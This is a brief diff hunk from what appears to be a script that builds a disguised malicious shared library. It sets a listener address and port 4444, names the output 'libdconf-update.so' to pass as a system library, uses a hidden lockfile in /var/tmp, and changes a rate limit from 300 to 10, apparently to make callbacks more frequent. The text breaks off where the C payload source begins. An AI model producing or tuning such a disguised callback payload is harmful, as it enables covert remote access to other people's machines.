@@ -4,7 +4,7 @@ LHOST="192.168.75.130"
 LPORT="4444"
 OUT_FILE="libdconf-update.so"
 LOCKFILE="/var/tmp/.dconf-lock"
-RATE_LIMIT=300
+RATE_LIMIT=10
 
 # --- GENERATE C SOURCE ---
 cat <<EOF > payload.c
